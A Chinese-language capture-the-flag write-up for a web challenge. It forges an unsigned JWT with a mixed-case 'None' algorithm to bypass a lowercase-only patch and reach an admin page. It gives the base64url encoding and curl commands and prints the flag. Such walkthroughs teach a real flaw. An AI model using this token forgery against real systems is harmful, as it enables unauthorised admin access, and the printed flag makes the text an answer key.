# 20 JWT是啥 · Web

- 分类：Web ｜ 分值：200 ｜ 状态：平台已解
- 页面用 JWT 做登录态，把 `alg` 写成大小写混排的 `None` 就能绕过验签，拿到管理员看板里的 flag。

## 题目

- 题号 20，题名「JWT是啥」，题面无正文，出题人 chen。
- 动态容器，站点是一个「2026 春季招新」成员门户：`/` 是公开页，`/admin.php` 是管理后台，登录态放在 `token` cookie 里。

## 思路

- 先看首页和页面里的「更新日志」，作者明确写了「已修复 alg=none 的问题」——说明修的是精确匹配 `none`，试试大小写变体。
- JWT 三段式：header.payload.signature。把 header 里的 `alg` 改成 `None`、签名段留空，再放一个 `role: admin` 的 payload。
- 常见弱密钥爆破（字典跑 HS256）在本机耗时很久也没结果，绕开签名才是本题正解。

## 关键步骤

1. 打开站点，随便登录一下（账号填 `guest` 即可），浏览器里就种下了 `token` cookie。F12 → Application → Cookies，能看到的是一段标准的三段式 JWT。
2. 翻「更新日志」页，确认作者已经修过 `alg=none`，判断它只是做了字符串精确比较。
3. 回到终端，手拼一个新的 header 和 payload，各自做一次 base64url（`base64 -w0` 后把 `+` `/` 换成 `-` `_`，再去掉末尾的 `=`）：

   ```bash
   echo -n '{"alg":"None","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
   echo -n '{"uid":20260001,"name":"guest","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
   ```

   把两段输出按 `header.payload.` 拼起来，第三段签名位置留空。

4. 在终端带着这个 token 请求后台，看看有没有放行：

   ```bash
   curl -s -H "Cookie: token=<header>.<payload>." "http://103.85.23.250:32289/admin.php" | grep -o "S3C{[^}]*}"
   ```

   取到 flag 说明 `None` 被当成「无签名」分支放行了。

5. 顺手把 `alg` 换成小写 `none` 再请求一次，返回的是登录页、没有 flag——和更新日志里说的修复对得上；换成 `NONE`、`nOnE` 同样能过，说明比较确实是大小写敏感的精确匹配。

6. 换回 `None` 的那个 token，在浏览器里把它写进 `token` cookie（Application → Cookies 直接改 Value），刷新 `/admin.php`，页面进到「2026 春季招新 · 内部看板」，顶部「内部通知」里就是 flag：

   ![管理后台](img/02-admin.png)

## Flag

```text
S3C{a3890e3b2047}
```

## 踩坑 / 备注

- 只改 payload 不改 `alg` 没用，服务端会验签失败；关键是让 `alg` 走「无签名」分支。
- 小写 `none` 是被明确修复掉的，必须用大小写变体（`None` / `NONE` / `nOnE`）才能绕过那一次字符串比较。
- 手拼 JWT 时别用标准 base64 的 `=` 填充，JWT 段要求去掉填充，否则服务端解析 header 直接报错。
